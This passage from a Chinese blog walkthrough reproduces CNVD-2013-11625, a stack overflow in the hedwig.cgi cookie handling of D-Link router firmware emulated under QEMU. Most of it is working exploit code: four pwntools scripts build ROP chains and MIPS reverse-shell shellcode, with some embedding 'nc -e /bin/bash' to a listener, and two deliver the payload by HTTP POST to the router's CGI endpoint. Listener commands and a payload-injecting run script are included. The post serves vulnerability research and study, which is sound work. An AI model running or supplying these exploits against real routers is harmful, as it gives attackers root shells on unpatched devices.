<span class="token punctuation">(</span>mipsel-linux-gnu-gdb<span class="token punctuation">)</span> vmmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B035.png" alt="CNVD-2013-11625复现35.png"></p><p>获得 libc 基地址为：<code>0x77f34000</code></p><p>接下来还需要找出栈溢出的长度，这里直接通过 <code>cyclic</code> 来尝试，首先生成 2000 个字符然后写入 <code>payload</code> 中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cyclic <span class="token number">2000</span> <span class="token operator">&gt;</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后将 <code>paylaod</code> 文件上传到路由器文件系统的根目录</p><p>退出宿主机的 GDB 调试，重新运行 <code>run.sh</code>，通过 <code>cat payload</code> 将我们的 <code>payload</code> 的内容读到 <code>uid=</code> 后面，然后 GDB 重新连接调试程序：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B036.png" alt="CNVD-2013-11625复现36.png"></p><p>没有显示刚刚出现的 <code>"cat: payload: No such file or directory"</code> 就说明 <code>payload</code> 读取成功了</p><p>由于溢出发生在 <code>hedwigcgi_main()</code> 函数，我们直接把断点打在 <code>hedwigcgi_main()</code> 函数结束的地方，通过观察返回地址来确定栈溢出的长度：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B037.png" alt="CNVD-2013-11625复现37.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B038.png" alt="CNVD-2013-11625复现38.png"></p><p>可以看到 <code>hedwigcgi_main()</code> 函数结束后跳转的地址是 <code>0x646b6161</code>，通过 <code>cyclic -l</code> 获得偏移为 1009</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B039.png" alt="CNVD-2013-11625复现39.png"></p><blockquote><p><em>关于 MIPS 架构下的 ROP 构造我不是很熟悉。。。所以暂时不做过多解释，等我深入研究之后再做总结归纳吧</em></p><p>先参考一下 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> 对 MIPS 的 ROP 构造这一块儿的讲解：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_2">[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p></blockquote><hr><h4 id="法一：向-QEMU-虚拟机上传-payload"><a href="#法一：向-QEMU-虚拟机上传-payload" class="headerlink" title="法一：向 QEMU 虚拟机上传 payload"></a>法一：向 QEMU 虚拟机上传 payload</h4><blockquote><p>这种方式我们直接将 payload 写入文件，然后上传到 QEMU 虚拟机，<strong>通过设置环境变量来读取 payload 作为 <code>uid</code>，从而触发漏洞反弹 shell</strong></p></blockquote><p>poc 如下：</p><ol><li>纯 ROP 链，即构造 <code>system("/bin/sh")</code> 来 getshell</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
cmd <span class="token operator">=</span> <span class="token string">b'nc -e /bin/bash 192.168.2.1 8888'</span>   <span class="token comment"># 反弹 shell</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x77f34000</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x53200</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># s0  system_addr - 1</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x169C4</span><span class="token punctuation">)</span> <span class="token comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x32A98</span><span class="token punctuation">)</span> <span class="token comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> cmd
 
fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>
fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>通过 shellcode 来 getshell（由于 MIPS 架构是无法开启 NX 保护的，因此可以使用 <code>ret2shellcode</code>，但需要注意 <code>shellcode</code> 中不能存在 <code>b'\x00'</code> 等字符防止导致 <code>sprintf</code> 被截断）</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x77f34000</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x436D0</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x56BD0</span><span class="token punctuation">)</span> <span class="token comment"># s3  sleep</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x57E50</span><span class="token punctuation">)</span> <span class="token comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span>
 
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x37E6C</span><span class="token punctuation">)</span> <span class="token comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3B974</span><span class="token punctuation">)</span> <span class="token comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span>
 
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    slti $a0, $zero, 0xFFFF
    li $v0, 4006
    syscall 0x42424
 
    slti $a0, $zero, 0x1111
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    not $a1, $t4
    slti $a2, $zero, 0xFFFF
    li $v0, 4183
    syscall 0x42424
 
    andi $a0, $v0, 0xFFFF
    li $v0, 4041
    syscall 0x42424
    li $v0, 4041
    syscall 0x42424
 
    lui $a1, 0xB821 # Port: 8888
    ori $a1, 0xFF01
    addi $a1, $a1, 0x0101
    sw $a1, -8($sp)
 
    li $a1, 0x0102A8C0 # IP: 192.168.2.1
    sw $a1, -4($sp)
    addi $a1, $sp, -8
 
    li $t4, 0xFFFFFFEF
    not $a2, $t4
    li $v0, 4170
    syscall 0x42424
 
    lui $t0, 0x6962
    ori $t0, $t0,0x2f2f
    sw $t0, -20($sp)
 
    lui $t0, 0x6873
    ori $t0, 0x2f6e
    sw $t0, -16($sp)
 
    slti $a3, $zero, 0xFFFF
    sw $a3, -12($sp)
    sw $a3, -4($sp)
 
    addi $a0, $sp, -20
    addi $t0, $sp, -20
    sw $t0, -8($sp)
    addi $a1, $sp, -8
 
    addiu $sp, $sp, -20
 
    slti $a2, $zero, 0xFFFF
    li $v0, 4011
    syscall 0x42424
'''</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> shellcode
 
fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>
fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这两个 poc 都设置了反弹 shell，反弹的 IP 地址为宿主机 192.168.2.1，端口号为 8888</p><p>为了接收反弹 shell，首先<strong>在宿主机开启一个监听</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B042.png" alt="CNVD-2013-11625复现42.png"></p><p>从上面两个 poc 脚本之中选择一个，在宿主机上写入 <code>poc.py</code>，然后执行 <code>poc.py</code> 生成 payload</p><p>我这里以第一个 poc 为例：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B040.png" alt="CNVD-2013-11625复现40.png"></p><p>将这个新生成的 payload 文件上传到 QEMU 虚拟机的路由器文件系统根目录下，替换掉前面用来测试溢出的 payload 文件</p><p>然后修改一下 <code>run.sh</code> 中的启动命令，因为我们现在不需要 gdbserver 调试了，直接启动 <code>hedwig.cgi</code> 即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token string">"11"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token string">"uid=<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> payload<span class="token variable">`</span></span>"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"2333"</span>
<span class="token comment"># echo "winmt=pwner" | ./gdbserver 127.0.0.1:6666 /htdocs/web/hedwig.cgi</span>
<span class="token builtin class-name">echo</span> <span class="token string">"winmt=pwner"</span> <span class="token operator">|</span> /htdocs/web/hedwig.cgi
<span class="token builtin class-name">unset</span> CONTENT_LENGTH
<span class="token builtin class-name">unset</span> CONTENT_TYPE
<span class="token builtin class-name">unset</span> HTTP_COOKIE
<span class="token builtin class-name">unset</span> REQUEST_METHOD
<span class="token builtin class-name">unset</span> REQUEST_URI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B041.png" alt="CNVD-2013-11625复现41.png"></p><p>在 QEMU 虚拟机中运行 <code>run.sh</code>，然后宿主机上会显示已连接，并且可以正常使用 shell 命令查看路由器系统中的内容：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B043.png" alt="CNVD-2013-11625复现43.png"></p><p>而且我们是 root 权限用户，可以任意向路由器系统写入文件：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B044.png" alt="CNVD-2013-11625复现44.png"></p><p>到此为止，漏洞复现成功！</p><hr><h4 id="法二：向-httpd-服务发送-HTTP-报文"><a href="#法二：向-httpd-服务发送-HTTP-报文" class="headerlink" title="法二：向 httpd 服务发送 HTTP 报文"></a>法二：向 httpd 服务发送 HTTP 报文</h4><blockquote><p><strong>这种方式就需要用到前面开启的 HTTP 服务了</strong>，我们直接以 HTTP 报文的形式发送 payload</p></blockquote><p>我们前面在 <code>http_conf</code> 中配置了如下内容来启动 <code>httpd</code> 服务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Server <span class="token punctuation">{</span>
    ServerName <span class="token string">"Linux, HTTP/1.1, "</span>     <span class="token comment"># 服务器的名称和协议</span>
    ServerId <span class="token string">"1234"</span>                    <span class="token comment"># 服务器的标识符</span>
    Family inet                        <span class="token comment"># 使用的协议族，这里是 IPv4</span>
    Interface eth0                     <span class="token comment"># 绑定的网络接口，这里是网卡 eth0</span>
    Address <span class="token number">192.168</span>.2.2                <span class="token comment"># qemu 的 ip 地址</span>
    Port <span class="token string">"4321"</span>                        <span class="token comment"># 对应 web 访问端口，服务器监听端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是直接向 192.168.2.2:4321 发送 HTTP 报文</p><p>poc 如下：</p><ol><li>纯 ROP 链，即构造 <code>system("/bin/sh")</code> 来 getshell</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

cmd <span class="token operator">=</span> <span class="token string">b'nc -e /bin/bash 192.168.2.1 8888'</span>   <span class="token comment"># 反弹 shell</span>

libc_base <span class="token operator">=</span> <span class="token number">0x77f34000</span>

<span class="token comment"># 创建 payload</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x53200</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># s0  system_addr - 1</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x169C4</span><span class="token punctuation">)</span>      <span class="token comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x32A98</span><span class="token punctuation">)</span>      <span class="token comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span>
payload <span class="token operator">+=</span> cmd

<span class="token comment"># 定义目标 URL 和数据</span>
url <span class="token operator">=</span> <span class="token string">"http://192.168.2.2:4321/hedwig.cgi"</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"winmt"</span><span class="token punctuation">:</span> <span class="token string">"pwner"</span><span class="token punctuation">}</span>

<span class="token comment"># 定义请求头</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload<span class="token punctuation">,</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
    <span class="token string">"Content-Length"</span><span class="token punctuation">:</span> <span class="token string">"11"</span>
<span class="token punctuation">}</span>

<span class="token comment"># 发送 POST 请求</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

<span class="token comment"># 打印响应</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>通过 shellcode 来 getshell（由于 MIPS 架构是无法开启 NX 保护的，因此可以使用 <code>ret2shellcode</code>，但需要注意 <code>shellcode</code> 中不能存在 <code>\x00</code> 等字符防止导致 <code>sprintf</code> 被截断）</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x77f34000</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x436D0</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x56BD0</span><span class="token punctuation">)</span> <span class="token comment"># s3  sleep</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x57E50</span><span class="token punctuation">)</span> <span class="token comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span>
 
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x37E6C</span><span class="token punctuation">)</span> <span class="token comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3B974</span><span class="token punctuation">)</span> <span class="token comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span>
 
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    slti $a0, $zero, 0xFFFF
    li $v0, 4006
    syscall 0x42424
 
    slti $a0, $zero, 0x1111
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    li $v0, 4006
    syscall 0x42424
 
    li $t4, 0xFFFFFFFD
    not $a0, $t4
    not $a1, $t4
    slti $a2, $zero, 0xFFFF
    li $v0, 4183
    syscall 0x42424
 
    andi $a0, $v0, 0xFFFF
    li $v0, 4041
    syscall 0x42424
    li $v0, 4041
    syscall 0x42424
 
    lui $a1, 0xB821 # Port: 8888
    ori $a1, 0xFF01
    addi $a1, $a1, 0x0101
    sw $a1, -8($sp)
 
    li $a1, 0x0102A8C0 # IP: 192.168.2.1
    sw $a1, -4($sp)
    addi $a1, $sp, -8
 
    li $t4, 0xFFFFFFEF
    not $a2, $t4
    li $v0, 4170
    syscall 0x42424
 
    lui $t0, 0x6962
    ori $t0, $t0,0x2f2f
    sw $t0, -20($sp)
 
    lui $t0, 0x6873
    ori $t0, 0x2f6e
    sw $t0, -16($sp)
 
    slti $a3, $zero, 0xFFFF
    sw $a3, -12($sp)
    sw $a3, -4($sp)
 
    addi $a0, $sp, -20
    addi $t0, $sp, -20
    sw $t0, -8($sp)
    addi $a1, $sp, -8
 
    addiu $sp, $sp, -20
 
    slti $a2, $zero, 0xFFFF
    li $v0, 4011
    syscall 0x42424
'''</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> shellcode

<span class="token comment"># 定义目标 URL 和数据</span>
url <span class="token operator">=</span> <span class="token string">"http://192.168.2.2:4321/hedwig.cgi"</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"winmt"</span> <span class="token punctuation">:</span> <span class="token string">"pwner"</span><span class="token punctuation">}</span>

<span class="token comment"># 定义请求头</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"Cookie"</span>        <span class="token punctuation">:</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload<span class="token punctuation">,</span>
    <span class="token string">"Content-Type"</span>  <span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
    <span class="token string">"Content-Length"</span><span class="token punctuation">:</span> <span class="token string">"11"</span>
<span class="token punctuation">}</span>

<span class="token comment"># 发送 POST 请求</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>

<span class="token comment"># 打印响应</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这两个 poc 都设置了反弹 shell，反弹的 IP 地址为宿主机 192.168.2.1，端口号为 8888</p><p>为了接收反弹 shell，首先<strong>在宿主机开启一个监听</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B042.png" alt="CNVD-2013-11625复现42.png"></p><p>从上面两个 poc 脚本之中选择一个，我这里以第一个 poc 为例：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B045.png" alt="CNVD-2013-11625复现45.png"></p><p>可以看到反弹 shell 初始目录位于 <code>/htdocs/web</code>，我们仍然是 root 权限用户</p><p>到此为止，漏洞复现成功！</p><hr><h3 id="QEMU-用户级复现"><a href="#QEMU-用户级复现" class="headerlink" title="QEMU 用户级复现"></a>QEMU 用户级复现</h3><blockquote><p><strong>QEMU 用户级层面的漏洞复现不需要进行仿真</strong>，但相比之下，需要进行仿真的系统级复现更加直观、更符合现实场景，这里主要是介绍 QEMU 用户级层面的漏洞复现方式</p></blockquote><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先打开<strong>宿主机</strong>的路由器文件系统根目录</p><p>生成 2000 个字符的 payload 文件，用来测试 <code>uid</code> 溢出到栈上返回地址所需的字节数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cyclic <span class="token number">2000</span> <span class="token operator">&gt;</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建以下 <code>run.sh</code> 脚本，通过 QEMU 用户模式启动 <code>/htdocs/cgibin</code> 程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
 
<span class="token assign-left variable">INPUT</span><span class="token operator">=</span><span class="token string">"winmt=pwner"</span>
